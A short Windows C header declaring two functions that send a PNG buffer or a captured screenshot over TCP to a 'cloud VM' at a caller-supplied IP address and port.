#ifndef CLOUDTRANSFER_H
#define CLOUDTRANSFER_H

#include <windows.h>
#include <stdint.h>

// Send PNG buffer to cloud VM via TCP socket
int SendBufferToCloud(const BYTE* pngBuffer, DWORD bufferSize,
    const char* cloudIP, uint16_t cloudPort);

int SendScreenShotToCloud(const char* cloudIP, uint16_t cloudPort);
#endif